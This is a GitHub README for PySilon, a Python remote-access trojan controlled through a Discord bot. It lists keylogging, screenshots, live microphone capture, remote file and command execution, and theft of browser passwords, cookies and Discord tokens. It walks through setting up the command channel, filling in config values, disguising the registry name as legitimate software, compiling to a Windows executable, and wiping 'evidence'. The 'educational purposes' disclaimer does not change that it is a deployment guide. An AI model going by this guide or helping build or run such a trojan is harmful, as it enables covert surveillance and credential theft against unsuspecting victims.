# PySilon
Advanced RAT malware written in Python, fully controllable through Discord.

# Disclaimer
> Information and code provided on this repository are for educational purposes only. The creator is no way responsible for any direct or indirect damage caused due to the misusage of the information. Everything you do, you are doing at your own risk and responsibility.

# Features
### PySilon malware can do plenty of things, like:
- log every key pressed on keyboard
- take screenshots anytime you want
- record microphone input (24/7) and save it in .wav files
- stream live microphone input on voice channel
- browse files on target PC
- upload and download files from target PC
- grab history, cookies and passwords saved in web browsers
- grab discord tokens and system information
- browse and kill running processes
- execute files
- run CMD commands
- update itself (todo)

# Preparation
This malware is designed for Windows, however, you can prepare everything on Linux as well.<br />
`git clone https://github.com/mategol/pylison-python`<br />
`pip install -r requirements.txt`<br />
<a href="https://github.com/mategol/pysilon-malware#setup">`Follow the Setup instructions`</a>

# Available commands
  <a href="https://github.com/mategol/pysilon-malware#ss">`.ss`</a> - take screenshot at any time<br />
  <a href="https://github.com/mategol/pysilon-malware#join">`.join`</a> - join voice-channel and stream live microphone input<br />
  <a href="https://github.com/mategol/pysilon-malware#show-what-to-show">`.show <what-to-show>`</a> - get list of running processes or available commands<br />
  <a href="https://github.com/mategol/pysilon-malware#kill-process-id">`.kill <process-id>`</a> - kill any running process<br />
  <a href="https://github.com/mategol/pysilon-malware#grab-what-to-grab">`.grab <what-to-grab>`</a> - grab for example saved passwords in web browsers<br />
\* <a href="https://github.com/mategol/pysilon-malware#clear">`.clear`</a> - clear messages from file-related channel<br />
\* <a href="https://github.com/mategol/pysilon-malware#pwd">`.pwd`</a> - show working directory<br />
\* <a href="https://github.com/mategol/pysilon-malware#tree">`.tree`</a> - show tree of working directory<br />
\* <a href="https://github.com/mategol/pysilon-malware#ls">`.ls`</a> - list content of working directory<br />
\* <a href="https://github.com/mategol/pysilon-malware#cd-directory">`.cd <dir>`</a> - change working directory<br />
\* <a href="https://github.com/mategol/pysilon-malware#download-file-or-directory">`.download <file-or-dir>`</a> - download any file or zipped directory (also greater than 8MB ones) from target PC<br />
\* <a href="https://github.com/mategol/pysilon-malware#upload-type-filename">`.upload <type> [name]`</a> - upload any file or zipped directory (also greater than 8MB ones) onto target PC<br />
\* <a href="https://github.com/mategol/pysilon-malware#start-file">`.start <file>`</a> - run any file on target PC<br />
\* <a href="https://github.com/mategol/pysilon-malware#remove-file-or-dir">`.remove <file-or-dir>`</a> - remove file or directory on target PC<br />
  <a href="https://github.com/mategol/pysilon-malware#update-access-code">`.update <access-code>`</a> - update PySilon remotely<br />
  <a href="https://github.com/mategol/pysilon-malware#implode-access-code">`.implode <access-code>`</a> - remove PySilon from target PC and clean the "evidence"<br />

<br />\* command available on file-related channel only

# Setup

<b>This process consists of 3 stages:</b>
> <a href="https://github.com/mategol/pysilon-malware#prepare-discord-server-and-discord-bot">1. Prepare Discord server and Discord BOT</a><br />
> <a href="https://github.com/mategol/pysilon-malware#set-up-required-values-in-source-code">2. Set up required values in source code</a><br />
> 3. Compile malware to Windows executable<br />

<span align='center'>

### Prepare Discord server and Discord BOT

> First of all, you need Discord server as environment for remote controlling PySilon. In order to do that, create new one:

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203310675-fc589377-63f7-43f0-b69e-ec7bfaa75b5d.jpg" /></p>

> Then, create 4 text-channels and 1 voice-channel for different use:<br />
> • main -> for main KeyLogger output and general commands<br />
> • spam-gaming -> for filtered KeyLogger output while target is (for example) playing game<br />
> • recordings -> for storing microphone recordings<br />
> • file-related -> for everything that is related to files<br />
> • Live microphone -> for streaming live microphone input

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203312123-2d5015a2-6a2e-46fd-8104-f1fc5ff409a9.jpg" /></p>

> Then, go to <a href="https://discord.com/developers/applications">Discord Developer Portal</a> and create new application:

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203314173-20b1ff5e-c2e4-4fad-995a-63aaa8bd4913.jpg" /></p>

> Then, go to the BOT section and add a BOT:

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203314786-d171c333-febe-47d3-8670-bd6cf09b98ea.jpg" /></p>

> Then, check all "intents" and save changes:

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203315507-95ded29a-d6db-4681-9715-c70c27aabd0f.png" /></p>

> Then, reset BOT-Token and copy it for later use:

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203316364-71fd167d-bf0c-4592-90f3-992da45b6891.jpg" /></p>

> Then, go to "OAuth2" section and "URL Generator" tab:

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203318137-fe379bb9-e94b-4572-80f4-783f32c2d81f.png" /></p>

> THen, check "bot" scope and "Administrator" permissions:

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203318332-27c1a692-3e56-41e4-b7df-0f0289768806.png" /></p>

> Then, copy and open generated URL. New window will appear. Select "PySilon controller" server and BOT will join:

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203319649-e4db527a-741e-4436-8bb1-d7fe674b0e2b.jpg" /></p>

> As you can see, BOT is now in the server:

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203319836-e7aeb93f-3c22-491b-aea2-cd2aaa41d65d.png" /><br /></p>

### Set up required values in source code

> To make it possible, you need to enable "Developer mode" in Discord settings

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203321226-e01e4c39-678b-4f77-9bee-1607ad43c1d0.jpg" /></p>

> Now, open "main.py" in any text editor and paste BOT-Token coped earlier in 47th line:

</span>

```python
bot_token = ''   # Paste here BOT-token
```

<span align='center'>

> Now, set program name in 48th line that will be shown in registry:   (something like legitimate software)

</span>

```python
software_registry_name = 'PySilon'   # Software name shown in registry
```

<span align='center'>

> You can also change directory name (49th line) that will be created in `C:/Users/{username}/` and executable name (50th line):

</span>

```python
software_directory_name = software_registry_name
software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # MUST end with '.exe'
# As you can see, theese variables are set based on registry name by default. However you can just change it to string if you want
```

<span align='center'>

> To set channel-IDs in lines 53-57, you need to copy them by right-clicking on channel and then 'Copy ID':

<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203323394-27ff946c-4a9b-4c83-ae77-9dec1fa14842.jpg" /></p>

> Last thing to do is set a secret password (line 60) for authenticating actions that can seriously affect the malware:

</span>

```python
access_code = ''   # Set access code for ".update" and ".implode" commands that can result in errors shutting down the malware
```
<br />

<span align='center'>

> **`Now, everything is set up for compiling the malware into Windows executable`**

<br />

# Commands manual

<br />

### `.ss`
> **This command takes a screenshot of target PC at any time:**<br />
<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203397679-78bf53de-0a66-4ee2-811e-5b8cf10377dc.png" /></p>

<br />

### `.join`
> **This command makes BOT join voice-channel and stream live microphone input:**<br />
<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203397968-79001712-5fd1-43cd-a898-774c57c0c1e6.png" /></p>

<br />

### `.show <what-to-show>`
> **`<what-to-show>` - as typed, specifies the information that you want to obtain. These can be "`processes`" or "`commands`" at the moment *(without quotes)*.**<br />
> **"`processes`" gives you a list of currently running processes on target PC.**<br />
> **"`commands`" gives you a list of all available commands along with short brief about them.**<br />
> **This command shows you specific types of information:**<br />
<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203438468-43aed4e3-8d21-41a9-87a0-3630b58979b8.jpg" /></p>

<br />

### `.kill <process-id>`
> **`<process-id>` - index of process attached after `.show processes` command**<br />
> **This command kills running process:**<br />
<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203439640-f7754516-be78-4e06-81f8-b22f08eeebd1.jpg" /></p>

<br />

### `.grab <what-to-grab>`
> **`<what-to-grab>` - as typed, specifies the things you want to grab. These can be "`passwords`" or "`discord`" at the moment *(without quotes)*.**<br />
> **"`passwords`" grabs all passwords saved in web browsers.**<br />
> **"`discord`" grabs Discord authentication Tokens.**<br />
> **"`history`" grabs web browsers history.**<br />
> **"`cookies`" grabs cookies.**<br />
> **This command grabs sensitive data *(for example saved credentials)*:**<br />
<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203449847-57b7c9f4-de62-4b5c-acd6-898b5f8f1520.png" /></p>

<br />

### `.clear`
> **This command clears messages from file-related channel:**<br />
<p align='center'><img src="https://user-images.githubusercontent.com/44233157/203398296-c73b79e8-9f70-45ec-9607-586cd54767a6.png" /></p>

<br />

### `.pwd`
> **This command shows you working directory path:**<br />

<br />

### `.tree`
> **This command shows you file-and-directory structure of working directory:**<br />

<br />

### `.ls`
> **This command shows you content of working directory:**<br />

<br />

### `.cd <directory>`
> **This command changes working directory:**<br />

<br />

### `.download <file-or-directory>`
> **This command allows you to download a file or zipped directory from target PC:**<br />

<br />

### `.upload <type> [filename]`
> **`<type>` - "`single`" or "`multiple`" *(without quotes)***<br />
> **"`single`" means that you want to upload one file *(with size smaller than 8MB)***<br />
> **"`multiple`" means that you want to upload multiple files *(prepared by splitter.py with total size greater than 8MB)***<br />
> **`[filename]` - name of uploaded file *(this option is required only wtih `type` of `multiple`)***<br />
> **This command allows you to upload a file or zipped directory onto target PC:**<br />

<br />

### `.start <file>`
> **This command starts any file on target PC:**<br />

<br />

### `.remove <file-or-dir>`
> **This command removes any file or directory on target PC:**<br />

<br />

### `.update <access-code>`
> **`<access-code>` - secret password for authentication of potentially risky actions *(like errors shutting down the malware)*. Access Code is defined in 60th line of main.py**<br />
> **This command updates already working malware remotely *(with executable prepared by you and splitted by splitter.py)*:**<br />

<br />

### `.implode <access-code>`
> **`<access-code>` - secret password for authentication of potentially risky actions *(like errors shutting down the malware)*. Access Code is defined in 60th line of main.py**<br />
> **This command completely removes PySilon malware from target PC and cleans possible evidence:**<br />

<br />

</span>
